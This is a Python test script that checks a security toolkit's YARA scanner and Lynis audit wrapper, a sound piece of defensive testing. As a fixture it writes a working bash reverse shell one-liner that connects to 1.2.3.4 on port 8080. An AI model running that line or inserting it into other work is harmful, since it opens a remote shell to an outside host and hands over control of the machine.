import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools.arsenal import SecurityArsenal

passed = failed = 0
def check(name, cond):
    global passed, failed
    if cond:
        passed += 1; print(f"  ✅ {name}")
    else:
        failed += 1; print(f"  ❌ {name}")

print("\n[1] YARA Scanner Built-in Engine")
arsenal = SecurityArsenal()
# إنشاء ملف اختبار مؤقت يحتوي على توقيع reverse shell
test_file = "/tmp/test_suspicious_script.sh"
with open(test_file, "w") as f:
    f.write("#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/8080 0>&1\n")

findings = arsenal.scan_with_yara(test_file)
check("detects reverse shell via YARA engine", len(findings) > 0)
check("severity is critical", any(f["severity"] == "critical" for f in findings))
if os.path.exists(test_file):
    os.remove(test_file)

print("\n[2] Lynis Audit Graceful Execution")
lynis_res = arsenal.run_lynis_audit()
check("lynis audit returns structured dict", "findings" in lynis_res)

print(f"\n{'='*50}\nTOTAL ARSENAL TESTS: {passed} passed, {failed} failed\n{'='*50}")
